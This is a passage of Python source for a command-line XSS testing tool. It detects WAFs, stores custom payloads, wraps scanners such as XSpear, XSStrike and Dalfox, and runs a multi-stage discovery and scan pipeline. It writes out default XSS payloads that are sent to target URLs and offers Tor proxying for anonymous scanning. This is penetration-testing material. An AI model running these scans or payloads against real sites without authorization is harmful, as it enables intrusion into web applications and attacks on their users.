            print(f"  🚀 Speed improvement: ~{speed_improvement}x faster")

        # Cleanup expired cache
        expired_removed = cache_manager.cleanup_expired_cache()
        if expired_removed > 0:
            print(f"  🧹 Cleaned up {expired_removed} expired cache entries")


@cli.command()
@click.option("--url", required=True, help="URL to test for WAF")
@click.option("--output", help="Output file for WAF detection results")
def detect_waf(url, output):
    """Detect Web Application Firewall (WAF) on target URL."""
    print(f"[*] Detecting WAF on {url}")

    waf_signatures = {
        "cloudflare": ["cloudflare", "cf-ray", "__cfduid"],
        "aws": ["x-amzn-requestid", "x-amz-"],
        "fastly": ["fastly-debug-digest", "x-served-by"],
        "incapsula": ["incap_ses", "visid_incap"],
        "akamai": ["akamai", "x-akamai"],
        "sucuri": ["x-sucuri-id", "sucuri"],
        "mod_security": ["mod_security", "modsecurity"],
        "barracuda": ["barra"],
        "f5": ["f5-"],
        "citrix": ["citrix", "netscaler"],
    }

    detected_wafs = []

    try:
        with httpx.Client(timeout=10) as client:
            # Test with normal request
            response = client.get(url)
            headers = {k.lower(): v.lower() for k, v in response.headers.items()}

            # Check headers for WAF signatures
            for waf, signatures in waf_signatures.items():
                for sig in signatures:
                    if any(sig in h for h in headers.keys()) or any(
                        sig in v for v in headers.values()
                    ):
                        detected_wafs.append(waf)
                        break

            # Test with malicious payload
            test_payload = "<script>alert('xss')</script>"
            try:
                mal_response = client.get(f"{url}?test={test_payload}")
                if mal_response.status_code in [403, 406, 429, 501, 503]:
                    detected_wafs.append("unknown_waf")
            except (httpx.RequestError, httpx.HTTPStatusError) as e:
                print(f"[!] WAF test request failed: {e}")
                # Continue without WAF detection from malicious payload

    except Exception as e:
        print(f"[!] Error testing WAF: {e}")
        return

    # Save results to database
    if DB_AVAILABLE:
        try:
            db = get_db_manager()
            session = db.get_session()
            timestamp = datetime.now().isoformat()

            # Note: WAF detection could be stored as a custom table or in notes
            # For now, we'll just print the results
            session.close()

        except Exception as e:
            print(f"[!] Error with main database: {e}")

    # For WAF detection, we don't need to store in fallback DB for now
    # This is more of a reconnaissance step

    if detected_wafs:
        print(f"[+] Detected WAFs: {', '.join(set(detected_wafs))}")
        if output:
            with open(output, "w") as f:
                f.write("\n".join(set(detected_wafs)))
    else:
        print("[*] No WAF detected")


@cli.command()
@click.option("--payload", required=True, help="XSS payload to add")
@click.option("--category", help="Payload category")
@click.option("--description", help="Payload description")
@click.option("--tags", help="Comma-separated tags")
def add_payload(payload, category, description, tags):
    """Add custom XSS payload to database."""
    # Always use fallback database for custom payloads
    # This is local user data, not reconnaissance results
    conn = sqlite3.connect(FALLBACK_DB_PATH)
    c = conn.cursor()

    timestamp = datetime.now().isoformat()

    c.execute(
        """
        INSERT INTO custom_payloads 
        (payload, category, description, tags)
        VALUES (?, ?, ?, ?)
    """,
        (payload, category or "custom", description, tags),
    )

    conn.commit()
    conn.close()

    print(f"[+] Added payload to database: {payload[:50]}...")


@cli.command()
@click.option("--category", help="Filter by category")
@click.option("--active-only", is_flag=True, help="Show only active payloads")
def list_payloads(category, active_only):
    """List custom payloads from database."""
    # Always use fallback database for custom payloads
    conn = sqlite3.connect(FALLBACK_DB_PATH)
    c = conn.cursor()

    query = "SELECT * FROM custom_payloads WHERE 1=1"
    params = []

    if category:
        query += " AND category = ?"
        params.append(category)

    if active_only:
        query += " AND active = 1"

    query += " ORDER BY success_rate DESC, times_used DESC"

    c.execute(query, params)
    payloads = c.fetchall()
    conn.close()

    if payloads:
        print(f"[*] Found {len(payloads)} payloads:")
        for p in payloads:
            status = "Active" if p[4] else "Inactive"
            print(f"ID: {p[0]} | Category: {p[2]} | {status}")
            print(f"Payload: {p[1][:80]}...")
            if p[3]:  # description
                print(f"Description: {p[3]}")
            print(f"Success Rate: {p[5]:.2f} | Used: {p[6]} times")
            print("-" * 80)
    else:
        print("[*] No payloads found")


@cli.command()
@click.option("--url", required=True, help="Target URL for XSpear scan")
@click.option("--blind-url", help="Blind XSS callback URL")
@click.option("--threads", default=10, type=int, help="Number of threads for XSpear")
@click.option("--delay", default=1, type=float, help="Delay between requests")
@click.option("--payloads-file", help="Custom payloads file for XSpear")
@click.option("--output", help="Output file for XSpear results")
@click.option("--cache", is_flag=True, help="Enable caching for XSpear results")
@click.option("--cache-dir", default="xss_cache", help="Cache directory")
@click.option("--ai", is_flag=True, help="Enable AI analysis of XSpear results")
@click.option(
    "--ai-provider",
    type=click.Choice(["openai", "anthropic", "gemini"]),
    help="AI provider",
)
@click.option("--verbose", is_flag=True, help="Verbose XSpear output")
def xspear(
    url,
    blind_url,
    threads,
    delay,
    payloads_file,
    output,
    cache,
    cache_dir,
    ai,
    ai_provider,
    verbose,
):
    """Advanced XSS scanning with XSpear engine."""

    print(f"🔍 XSpear Advanced XSS Scanner")
    print(f"=" * 50)
    print(f"Target: {url}")

    if not check_binary("xspear"):
        print("[!] XSpear not found. Install with: gem install XSpear")
        return

    # Initialize cache if requested
    cache_manager = None
    if cache:
        cache_manager = XSSCacheManager(cache_dir=cache_dir)
        print(f"[+] Cache enabled: {cache_dir}")

    # Run XSpear scan
    print(f"[*] Starting XSpear scan...")
    result = run_xspear_with_cache(
        target=url,
        cache_manager=cache_manager,
        threads=threads,
        delay=delay,
        blind_url=blind_url,
        custom_payloads=payloads_file,
        output_file=output,
    )

    if not result or not result.get("success"):
        print(f"[!] XSpear scan failed")
        if result and result.get("error"):
            print(f"[!] Error: {result['error']}")
        return

    # Parse results
    parsed_results = parse_xspear_results(result)
    print(f"\n[+] XSpear scan completed!")
    print(f"[+] Found {len(parsed_results)} results")

    vulnerable_count = len([r for r in parsed_results if r.get("vulnerable")])
    if vulnerable_count > 0:
        print(f"[+] 🚨 {vulnerable_count} vulnerabilities detected!")
    else:
        print(f"[+] ✅ No vulnerabilities found")

    # Display results summary
    if parsed_results:
        print(f"\n📊 XSpear Results Summary:")
        for i, result in enumerate(parsed_results, 1):
            print(f"  {i}. {result.get('url', url)}")
            if result.get("vulnerable"):
                print(f"     🚨 VULNERABLE - {result.get('xss_type', 'XSS')}")
            if result.get("waf_detected"):
                print(f"     🛡️ WAF bypass attempted")
            if result.get("blind_xss"):
                print(f"     👻 Blind XSS potential")

    # AI Analysis
    if ai and parsed_results:
        print(f"\n🤖 XSpear AI Analysis")
        print(f"=" * 40)

        target_info = {
            "engine": "xspear",
            "blind_url": blind_url,
            "threads": threads,
            "ai_provider": ai_provider,
        }

        xspear_ai = xspear_ai_analysis(parsed_results, target_info)
        print(xspear_ai)

    # Save results to file if requested
    if output and parsed_results:
        try:
            with open(output, "w") as f:
                json.dump(parsed_results, f, indent=2)
            print(f"\n[+] Results saved to: {output}")
        except Exception as e:
            print(f"[!] Error saving results: {e}")

    # Display cache stats if cache was used
    if cache_manager:
        stats = cache_manager.get_cache_stats()
        print(f"\n📊 Cache Performance:")
        print(f"  Hit rate: {stats['hit_rate']}%")
        print(f"  Total cached: {stats['cached_results']}")


@cli.command()
@click.option("--url", required=True, help="Target URL for XSStrike scan")
@click.option("--threads", default=10, type=int, help="Number of threads for XSStrike")
@click.option("--delay", default=1, type=float, help="Delay between requests")
@click.option("--crawl", is_flag=True, help="Enable comprehensive crawling")
@click.option("--blind-url", help="Blind XSS callback URL")
@click.option("--fuzzer", is_flag=True, help="Enable fuzzing engine")
@click.option("--skip-dom", is_flag=True, help="Skip DOM XSS scanning")
@click.option("--params", help="Specific parameters to test (comma-separated)")
@click.option("--headers", help="Custom headers (key:value,key:value)")
@click.option("--output", help="Output file for XSStrike results")
@click.option("--cache", is_flag=True, help="Enable caching for XSStrike results")
@click.option("--cache-dir", default="xss_cache", help="Cache directory")
@click.option("--ai", is_flag=True, help="Enable AI analysis of XSStrike results")
@click.option(
    "--ai-provider",
    type=click.Choice(["openai", "anthropic", "gemini"]),
    help="AI provider",
)
@click.option("--verbose", is_flag=True, help="Verbose XSStrike output")
def xsstrike(
    url,
    threads,
    delay,
    crawl,
    blind_url,
    fuzzer,
    skip_dom,
    params,
    headers,
    output,
    cache,
    cache_dir,
    ai,
    ai_provider,
    verbose,
):
    """Advanced XSS scanning with XSStrike intelligence engine."""

    print(f"🎯 XSStrike Advanced XSS Intelligence Scanner")
    print(f"=" * 60)
    print(f"Target: {url}")

    # Check XSStrike availability
    xsstrike_available = any(
        os.path.exists(path)
        for path in [
            "XSStrike/xsstrike.py",
            "./XSStrike/xsstrike.py",
            "/opt/XSStrike/xsstrike.py",
            "/usr/local/bin/xsstrike.py",
            "xsstrike.py",
        ]
    )

    if not xsstrike_available:
        print("[!] XSStrike not found. Install with:")
        print("    git clone https://github.com/s0md3v/XSStrike")
        print("    cd XSStrike")
        print("    pip install -r requirements.txt --break-system-packages")
        return

    # Initialize cache if requested
    cache_manager = None
    if cache:
        cache_manager = XSSCacheManager(cache_dir=cache_dir)
        print(f"[+] Cache enabled: {cache_dir}")

    # Parse custom headers
    custom_headers = None
    if headers:
        try:
            custom_headers = {}
            for header_pair in headers.split(","):
                key, value = header_pair.split(":", 1)
                custom_headers[key.strip()] = value.strip()
            print(f"[+] Custom headers: {len(custom_headers)} headers")
        except Exception as e:
            print(f"[!] Error parsing headers: {e}")
            return

    # Parse parameters to test
    params_list = None
    if params:
        params_list = [p.strip() for p in params.split(",")]
        print(f"[+] Testing specific parameters: {params_list}")

    # Run XSStrike scan
    print(f"[*] Starting XSStrike intelligence scan...")
    print(
        f"[*] Features: Crawl={crawl}, Fuzzer={fuzzer}, DOM={'No' if skip_dom else 'Yes'}"
    )

    result = run_xsstrike_with_cache(
        target=url,
        cache_manager=cache_manager,
        threads=threads,
        delay=delay,
        crawl=crawl,
        blind_url=blind_url,
        custom_headers=custom_headers,
        fuzzer=fuzzer,
        skip_dom=skip_dom,
        params=params_list,
        output_file=output,
    )

    if not result or not result.get("success"):
        print(f"[!] XSStrike scan failed")
        if result and result.get("error"):
            print(f"[!] Error: {result['error']}")
        return

    # Parse results
    parsed_results = parse_xsstrike_results(result)
    print(f"\n[+] XSStrike scan completed!")
    print(f"[+] Found {len(parsed_results)} results")

    vulnerable_count = len([r for r in parsed_results if r.get("vulnerable")])
    if vulnerable_count > 0:
        print(f"[+] 🚨 {vulnerable_count} vulnerabilities detected!")
    else:
        print(f"[+] ✅ No vulnerabilities found")

    # Display detailed results summary
    if parsed_results:
        print(f"\n📊 XSStrike Intelligence Results:")
        for i, result in enumerate(parsed_results, 1):
            print(f"  {i}. {result.get('url', url)}")
            if result.get("vulnerable"):
                print(f"     🚨 VULNERABLE - {result.get('xss_type', 'XSS')}")
                print(f"     🎯 Confidence: {result.get('confidence', 80)}%")
                if result.get("context"):
                    print(f"     📋 Context: {result.get('context')}")
            if result.get("waf_detected"):
                print(f"     🛡️ WAF detected and bypassed")
            if result.get("dom_xss"):
                print(f"     🌐 DOM XSS vulnerability")
            if result.get("blind_xss"):
                print(f"     👁️ Blind XSS potential")
            if result.get("efficiency"):
                print(f"     📈 Payload efficiency: {result.get('efficiency')}%")

    # AI Analysis
    if ai and parsed_results:
        print(f"\n🤖 XSStrike AI Intelligence Analysis")
        print(f"=" * 50)

        target_info = {
            "engine": "xsstrike",
            "crawl_enabled": crawl,
            "fuzzer_enabled": fuzzer,
            "blind_url": blind_url,
            "custom_headers": custom_headers is not None,
            "threads": threads,
            "ai_provider": ai_provider,
        }

        xsstrike_ai = xsstrike_ai_analysis(parsed_results, target_info)
        print(xsstrike_ai)

    # Save results to file if requested
    if output and parsed_results:
        try:
            with open(output, "w") as f:
                json.dump(parsed_results, f, indent=2)
            print(f"\n[+] Results saved to: {output}")
        except Exception as e:
            print(f"[!] Error saving results: {e}")

    # Display cache stats if cache was used
    if cache_manager:
        stats = cache_manager.get_cache_stats()
        print(f"\n📊 Cache Performance:")
        print(f"  Hit rate: {stats['hit_rate']}%")
        print(f"  Total cached: {stats['cached_results']}")

    print(f"\n🎯 XSStrike scan complete!")


@cli.command()
@click.option("--url", required=True, help="URL to test")
@click.option("--param", help="Parameter to test")
@click.option("--payloads-file", help="Custom payloads file")
@click.option("--method", default="GET", help="HTTP method")
@click.option("--delay", default=1, type=float, help="Delay between requests")
@click.option("--ai", is_flag=True, help="Enable AI-powered analysis of results")
@click.option("--tor", is_flag=True, help="Use Tor proxy for anonymous testing")
@click.option("--tor-proxy", default="socks5://127.0.0.1:9050", help="Tor proxy URL")
def manual_test(url, param, payloads_file, method, delay, ai, tor, tor_proxy):
    """Manual XSS testing with custom payloads."""
    payloads = []

    # Load payloads
    if payloads_file and os.path.exists(payloads_file):
        with open(payloads_file) as f:
            payloads = [
                line.strip() for line in f if line.strip() and not line.startswith("#")
            ]
    else:
        # Default payloads
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "'><script>alert('XSS')</script>",
            "\"><script>alert('XSS')</script>",
        ]

    print(f"[*] Testing {len(payloads)} payloads on {url}")
    vulnerable_payloads = []

    try:
        with httpx.Client(timeout=10) as client:
            for i, payload in enumerate(payloads, 1):
                print(f"[*] Testing payload {i}/{len(payloads)}: {payload[:50]}...")

                if method.upper() == "GET":
                    if param:
                        test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                    else:
                        test_url = f"{url}?test={urllib.parse.quote(payload)}"

                    try:
                        response = client.get(test_url)
                        if payload in response.text:
                            print(f"[+] REFLECTED: {payload}")
                            vulnerable_payloads.append(payload)
                            save_result(
                                test_url,
                                param,
                                payload,
                                reflected=True,
                                tool_used="manual_test",
                                response_code=response.status_code,
                            )
                    except Exception as e:
                        print(f"[!] Error testing payload: {e}")

                time.sleep(delay)

    except Exception as e:
        print(f"[!] Error during testing: {e}")

    print(
        f"\n[*] Testing completed. Found {len(vulnerable_payloads)} reflected payloads."
    )


@cli.command()
@click.option("--target", required=True, help="Target domain/URL")
@click.option("--output", help="Output directory")
@click.option("--threads", default=20, help="Number of threads")
@click.option("--ai", is_flag=True, help="Enable AI-powered analysis of scan results")
@click.option("--tor", is_flag=True, help="Use Tor proxy for anonymous scanning")
@click.option("--tor-proxy", default="socks5://127.0.0.1:9050", help="Tor proxy URL")
def full_scan(target, output, threads, ai, tor, tor_proxy):
    """Full XSS scanning pipeline with multiple tools."""
    print(f"[*] Starting full XSS scan on {target}")

    # Create output directory
    if not output:
        output = f"xss_scan_{target.replace('://', '_').replace('/', '_')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"

    os.makedirs(output, exist_ok=True)

    # Step 1: URL Discovery
    print("[*] Phase 1: URL Discovery")
    urls_file = os.path.join(output, "urls.txt")

    if check_binary("gau"):
        print("[*] Running gau for URL discovery...")
        with open(urls_file, "w") as f:
            subprocess.run(["gau", target], stdout=f, stderr=subprocess.DEVNULL)

    if check_binary("waybackurls"):
        print("[*] Running waybackurls...")
        with open(urls_file, "a") as f:
            subprocess.run(["waybackurls", target], stdout=f, stderr=subprocess.DEVNULL)

    if check_binary("hakrawler"):
        print("[*] Running hakrawler...")
        with open(urls_file, "a") as f:
            subprocess.run(
                ["hakrawler", "-url", target, "-depth", "2"],
                stdout=f,
                stderr=subprocess.DEVNULL,
            )

    # Step 2: Parameter Discovery
    print("[*] Phase 2: Parameter Discovery")
    if check_binary("paramspider"):
        print("[*] Running paramspider...")
        subprocess.run(
            ["paramspider", "--domain", target, "--output", output],
            stderr=subprocess.DEVNULL,
        )

    # Step 3: XSS Testing
    print("[*] Phase 3: XSS Testing")
    if os.path.exists(urls_file):
        # XSpear testing
        if check_binary("xspear"):
            print("[*] Running XSpear...")
            xspear_output = os.path.join(output, "xspear_results.json")
            print(f"[*] XSpear results will be saved to: {xspear_output}")

            # Run XSpear on collected URLs
            with open(urls_file, "r") as f:
                urls = [line.strip() for line in f if line.strip()]

            all_xspear_results = []
            for i, url in enumerate(urls[:10], 1):  # Limit to first 10 URLs for speed
                print(f"[*] XSpear testing URL {i}/10: {url[:50]}...")
                result = run_xspear_scan(target=url, threads=threads, delay=1)

                if result and result.get("success"):
                    parsed = parse_xspear_results(result)
                    all_xspear_results.extend(parsed)
                    print(f"    [+] XSpear found {len(parsed)} results")
                else:
                    print(f"    [-] XSpear scan failed for {url}")

            # Save XSpear results
            if all_xspear_results:
                with open(xspear_output, "w") as f:
                    json.dump(all_xspear_results, f, indent=2)
                print(
                    f"[+] XSpear saved {len(all_xspear_results)} results to {xspear_output}"
                )

        if check_binary("dalfox"):
            print("[*] Running Dalfox...")
            dalfox_output = os.path.join(output, "dalfox_results.txt")
            with open(dalfox_output, "w") as f:
                subprocess.run(
                    ["dalfox", "file", urls_file, "--worker", str(threads)],
                    stdout=f,
                    stderr=subprocess.DEVNULL,
                )

        if check_binary("kxss"):
            print("[*] Running kxss...")
            kxss_output = os.path.join(output, "kxss_results.txt")
            with open(urls_file) as input_f, open(kxss_output, "w") as output_f:
                subprocess.run(
                    ["kxss"], stdin=input_f, stdout=output_f, stderr=subprocess.DEVNULL
                )

    print(f"[+] Full scan completed. Results saved in {output}/")


@cli.command()
def stats():
    """Show XSS testing statistics."""
    if DB_AVAILABLE:
        try:
            db = get_db_manager()
            session = db.get_session()

            # Get XSS vulnerabilities from main database
            total_vulns = (
                session.query(Vulnerability).filter_by(vuln_type=VulnType.XSS).count()
            )
            critical_vulns = (
                session.query(Vulnerability)
                .filter_by(vuln_type=VulnType.XSS, severity=VulnSeverity.CRITICAL)
                .count()
            )
            high_vulns = (
                session.query(Vulnerability)
                .filter_by(vuln_type=VulnType.XSS, severity=VulnSeverity.HIGH)
                .count()
            )

            # Recent activity (last 7 days)
            week_ago = datetime.now() - timedelta(days=7)
            recent_vulns = (
                session.query(Vulnerability)
                .filter(
                    Vulnerability.vuln_type == VulnType.XSS,
                    Vulnerability.discovered_date >= week_ago,
                )
                .count()
            )

            session.close()

            print("=== XSS Testing Statistics (Main Database) ===")
            print(f"Total XSS vulnerabilities: {total_vulns}")
            print(f"Critical severity: {critical_vulns}")
            print(f"High severity: {high_vulns}")
            print(f"Found this week: {recent_vulns}")

            return

        except Exception as e:
            print(f"[!] Error reading from main database: {e}")
            print("[*] Falling back to local database")

    # Fallback to local database
    conn = sqlite3.connect(FALLBACK_DB_PATH)
    c = conn.cursor()

    # Basic stats
    c.execute("SELECT COUNT(*) FROM results")
    total_tests = c.fetchone()[0]

    c.execute("SELECT COUNT(*) FROM results WHERE vulnerable = 1")
    vulnerable_found = c.fetchone()[0]

    c.execute("SELECT COUNT(*) FROM results WHERE reflected = 1")
    reflected_found = c.fetchone()[0]

    c.execute("SELECT COUNT(DISTINCT url) FROM results")
    unique_urls = c.fetchone()[0]

    # Tool usage stats
    c.execute(
        "SELECT tool_used, COUNT(*) FROM results GROUP BY tool_used ORDER BY COUNT(*) DESC"
    )
    tool_stats = c.fetchall()

    # Recent activity
    c.execute(
        "SELECT COUNT(*) FROM results WHERE timestamp > ?",
        ((datetime.now() - timedelta(days=7)).isoformat(),),
    )
    recent_tests = c.fetchone()[0]

    conn.close()

    print("=== XSS Testing Statistics (Fallback Database) ===")
    print(f"Total tests performed: {total_tests}")
    print(f"Vulnerable findings: {vulnerable_found}")
    print(f"Reflected payloads: {reflected_found}")
    print(f"Unique URLs tested: {unique_urls}")
    print(f"Tests this week: {recent_tests}")

    if total_tests > 0:
        success_rate = (vulnerable_found / total_tests) * 100
        print(f"Success rate: {success_rate:.2f}%")

    if tool_stats:
        print("\n=== Tool Usage ===")
        for tool, count in tool_stats:
            print(f"{tool}: {count} tests")


@cli.command()
@click.option(
    "--query", default="latest", help="Analysis query or 'latest' for recent results"
)
@click.option(
    "--provider",
    type=click.Choice(["openai", "anthropic", "gemini"]),
    help="AI provider for analysis",
)
@click.option("--model", help="Specific AI model to use")
@click.option("--context", help="Additional context for AI analysis")
@click.option("--limit", default=50, type=int, help="Number of results to analyze")
def ai_analyze(query, provider, model, context, limit):
    """Perform AI analysis on stored XSS test results."""
    click.echo("🤖 AI Analysis of XSS Results")
    click.echo("=" * 60)

    # Get recent results for analysis
    results = []

    if DB_AVAILABLE:
        try:
            db = get_db_manager()
            session = db.get_session()

            # Query recent vulnerabilities
            vulns = (
                session.query(Vulnerability)
                .filter_by(vuln_type=VulnType.XSS)
                .order_by(Vulnerability.discovered_date.desc())
                .limit(limit)
                .all()
            )

            for vuln in vulns:
                results.append(
                    {
                        "url": vuln.url,
                        "param": "extracted_from_description",
                        "payload": vuln.payload or "unknown",
                        "vulnerable": True,
                        "reflected": True,  # Assume reflected if stored as vuln
                        "method": "GET",
                        "response_code": 200,
                        "timestamp": vuln.discovered_date.isoformat(),
                        "severity": vuln.severity.value if vuln.severity else "medium",
                    }
                )

            session.close()

        except Exception as e:
            click.echo(f"Warning: Error accessing main database: {e}")
            click.echo("Falling back to local database...")

    # Fallback to local database if needed
    if not results:
        conn = sqlite3.connect(FALLBACK_DB_PATH)
        c = conn.cursor()

        c.execute("SELECT * FROM results ORDER BY timestamp DESC LIMIT ?", (limit,))
        rows = c.fetchall()
        conn.close()

        for r in rows:
            results.append(
                {
                    "url": r[1],
                    "param": r[2],
                    "payload": r[3],
                    "reflected": bool(r[4]),
                    "vulnerable": bool(r[5]),
                    "method": r[6] or "GET",
                    "response_code": r[7],
                    "timestamp": r[9],
                    "severity": r[11] or "low",
                }
            )

    if not results:
        click.echo("❌ No XSS test results found for analysis")
        return

    click.echo(f"📊 Analyzing {len(results)} XSS test results...")

    # Enhanced target info for AI analysis
    target_info = {
        "query": query,
        "ai_provider": provider,
        "ai_model": model,
        "ai_context": context,
        "analysis_scope": f"{len(results)} results",
        "analysis_timestamp": datetime.now().isoformat(),
    }

    # Perform AI analysis
    ai_analysis = ai_analyze_xss_results(results, query, target_info)
    click.echo(ai_analysis)

    # Enhanced analysis with provider-specific insights
    if provider or model or context:
        click.echo(f"\n" + "=" * 60)
        click.echo("🔬 Enhanced AI Provider Analysis")
        click.echo("=" * 60)

        if provider:
            click.echo(f"🤖 Provider: {provider}")
        if model:
            click.echo(f"🧠 Model: {model}")
        if context:
            click.echo(f"🎯 Context: {context}")

        # Provider-specific insights
        enhanced_insights = []
        if provider == "openai":
            enhanced_insights.extend(
                [
                    "• OpenAI GPT analysis optimized for security vulnerability assessment",
                    "• Advanced pattern recognition for XSS attack vectors",
                    "• Risk scoring with confidence intervals",
                ]
            )
        elif provider == "anthropic":
            enhanced_insights.extend(
                [
                    "• Claude analysis focused on constitutional AI safety principles",
                    "• Detailed risk mitigation strategies",
                    "• Comprehensive security recommendations",
                ]
            )
        elif provider == "gemini":
            enhanced_insights.extend(
                [
                    "• Google Gemini analysis with multimodal understanding",
                    "• Advanced payload categorization and effectiveness scoring",
                    "• Real-time threat intelligence integration",
                ]
            )

        if enhanced_insights:
            click.echo("💡 Provider-Specific Insights:")
            for insight in enhanced_insights:
                click.echo(f"  {insight}")

        click.echo("=" * 60)


@cli.command()
@click.option(
    "--provider",
    type=click.Choice(["openai", "anthropic", "gemini"]),
    help="Set default AI provider",
)
@click.option("--model", help="Set default AI model")
@click.option("--context", help="Set default AI analysis context")
@click.option("--show-config", is_flag=True, help="Show current AI configuration")
def ai_config(provider, model, context, show_config):
    """Configure AI analysis settings for XSSCli."""
    config_file = os.path.join(RECON_DIR, "xsscli_ai_config.json")

    # Load existing config
    config = {}
    if os.path.exists(config_file):
        try:
            with open(config_file, "r") as f:
                config = json.load(f)
        except (json.JSONDecodeError, IOError):
            config = {}

    # Show current configuration
    if show_config:
        click.echo("🤖 Current AI Configuration:")
        click.echo(f"  Provider: {config.get('provider', 'Not set')}")
        click.echo(f"  Model: {config.get('model', 'Not set')}")
        click.echo(f"  Context: {config.get('context', 'Not set')}")
        click.echo(f"  Config file: {config_file}")
        return

    # Update configuration
    updated = False
    if provider:
        config["provider"] = provider
        updated = True
        click.echo(f"✅ Set AI provider to: {provider}")

    if model:
        config["model"] = model
        updated = True
        click.echo(f"✅ Set AI model to: {model}")

    if context:
        config["context"] = context
        updated = True
        click.echo(f"✅ Set AI context to: {context}")

    if updated:
        # Save configuration
        try:
            with open(config_file, "w") as f:
                json.dump(config, f, indent=2)
            click.echo(f"💾 Configuration saved to: {config_file}")
        except IOError as e:
            click.echo(f"❌ Error saving configuration: {e}")
    else:
        click.echo(
            "ℹ️  No configuration changes made. Use --show-config to view current settings."
        )


@cli.command()
@click.option("--limit", default=20, help="Number of results to show")
@click.option("--vulnerable-only", is_flag=True, help="Show only vulnerable findings")
def show_results(limit, vulnerable_only):
    """Show recent XSS testing results."""
    results = []

    if DB_AVAILABLE:
        try:
            db = get_db_manager()
            session = db.get_session()

            # Query vulnerabilities from main database
            query = session.query(Vulnerability).filter_by(vuln_type=VulnType.XSS)

            if vulnerable_only:
                query = query.filter(Vulnerability.status != "false_positive")

            vulns = (
                query.order_by(Vulnerability.discovered_date.desc()).limit(limit).all()
            )

            for vuln in vulns:
                results.append(
                    {
                        "url": vuln.url,
                        "param": (
                            vuln.description.split("Parameter: ")[1].split(",")[0]
                            if "Parameter: " in (vuln.description or "")
                            else "N/A"
                        ),
                        "payload": vuln.payload or "N/A",
                        "vulnerable": True,
                        "reflected": True,  # Assume true for stored vulns
                        "tool": vuln.discovery_tool,
                        "severity": vuln.severity.value,
                        "timestamp": vuln.discovered_date.isoformat(),
                        "notes": vuln.description,
                    }
                )

            session.close()

        except Exception as e:
            print(f"[!] Error reading from main database: {e}")
            print("[*] Falling back to local database")
            # Fall through to fallback

    # Fallback or if main DB failed
    if not results:
        conn = sqlite3.connect(FALLBACK_DB_PATH)
        c = conn.cursor()

        query = "SELECT * FROM results WHERE 1=1"
        params = []

        if vulnerable_only:
            query += " AND vulnerable = 1"

        query += " ORDER BY timestamp DESC LIMIT ?"
        params.append(limit)

        c.execute(query, params)
        rows = c.fetchall()
        conn.close()

        for r in rows:
            results.append(
                {
                    "url": r[1],
                    "param": r[2] or "N/A",
                    "payload": r[3][:100] if r[3] else "N/A",
                    "vulnerable": bool(r[5]),
                    "reflected": bool(r[4]),
                    "tool": r[10],
                    "severity": r[11],
                    "timestamp": r[9],
                    "notes": r[12],
                }
            )

    if results:
        print(f"[*] Showing {len(results)} recent results")
        print("=" * 100)
        for r in results:
            vuln = "[VULN]" if r["vulnerable"] else "[SAFE]"
            refl = "[REFLECTED]" if r["reflected"] else "[NOT REFLECTED]"
            print(f"URL: {r['url']}")
            print(f"Parameter: {r['param']}")
            print(f"Payload: {r['payload']}...")
            print(f"Status: {vuln} | {refl}")
            print(
                f"Tool: {r['tool']} | Severity: {r['severity']} | Time: {r['timestamp']}"
            )
            if r["notes"]:
                print(f"Notes: {r['notes']}")
            print("-" * 100)
    else:
        print("[*] No results found")


@cli.command()
def cleanup():
    """Clean up old results and optimize database."""
    if DB_AVAILABLE:
        try:
            print("[*] Main database cleanup is handled by dbcli")
            print(
                "[*] Use 'python -m reconcli.dbcli cleanup' for main database maintenance"
            )
        except Exception as e:
            print(f"[!] Error with main database: {e}")

    # Clean up fallback database
    conn = sqlite3.connect(FALLBACK_DB_PATH)
    c = conn.cursor()

    # Remove old non-vulnerable results (older than 30 days)
    thirty_days_ago = (datetime.now() - timedelta(days=30)).isoformat()
    c.execute(
        "DELETE FROM results WHERE vulnerable = 0 AND timestamp < ?", (thirty_days_ago,)
    )
    deleted = c.rowcount

    conn.commit()
    conn.close()

    # Vacuum database (requires separate connection)
    conn = sqlite3.connect(FALLBACK_DB_PATH)
    conn.execute("VACUUM")
    conn.close()

    print(f"[*] Cleaned up {deleted} old results from local database and optimized")


# Additional utility commands
@cli.command()
@click.option("--input", required=True, help="File with URLs")
@click.option("--pattern", required=True, help="Grep pattern to search")
def gf(input, pattern):
    """Run gf (grep) on input file."""
    if not check_binary("gf"):
        print("[!] gf not found in PATH")
        return

    try:
        with open(input) as f:
            urls = [line.strip() for line in f if line.strip()]

        print(f"[*] Running gf on {len(urls)} URLs")
        for url in urls:
            # Use subprocess.run without shell=True for security
            try:
                result = subprocess.run(
                    ["gf", pattern],
                    input=url,
                    text=True,
                    capture_output=True,
                    timeout=10,
                )
                if result.stdout.strip():
                    print(result.stdout.strip())
            except subprocess.TimeoutExpired:
                print(f"[!] Timeout processing URL: {url[:50]}...")
            except Exception as e:
                print(f"[!] Error processing URL {url[:50]}...: {e}")

    except Exception as e:
        print(f"[!] Error running gf: {e}")


@cli.command()
@click.option("--target", required=True, help="Target URL or domain")
@click.option("--payloads", help="Custom payloads file")
@click.option("--threads", default=50, help="Number of threads")
@click.option("--output", help="Output file")
def dalfox(target, payloads, threads, output):
    """Run Dalfox XSS scanner."""
    if not check_binary("dalfox"):
        print("[!] dalfox not found in PATH")
        return

    cmd = ["dalfox", "url", target, "--worker", str(threads)]

    if payloads:
        cmd.extend(["--custom-payload", payloads])

    if output:
        cmd.extend(["-o", output])

    print(f"[*] Running Dalfox on {target}")
    try:
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode == 0:
            print("[+] Dalfox scan completed successfully")
            save_result(
                target,
                tool_used="dalfox",
                vulnerable=True if "VULN" in result.stdout else False,
            )
        else:
            print(f"[!] Dalfox error: {result.stderr}")
    except Exception as e:
        print(f"[!] Dalfox error: {e}")


@cli.command()
@click.option("--cache", is_flag=True, help="Enable caching for test results")
@click.option("--ai", is_flag=True, help="Enable AI analysis of results")
@click.option(
    "--ai-provider",
    type=click.Choice(["openai", "anthropic", "gemini"]),
    help="AI provider for analysis",
)
@click.option("--delay", default=0.5, type=float, help="Delay between requests")
@click.option("--verbose", is_flag=True, help="Verbose output")
def brutelogic_test(cache, ai, ai_provider, delay, verbose):
    """Test XSS payloads on Brute Logic's XSS testing page."""

    test_url = "https://x55.is/brutelogic/xss.php"

    click.echo("🔥 Brute Logic XSS Testing Lab")
    click.echo("=" * 50)
    click.echo(f"🎯 Target: {test_url}")
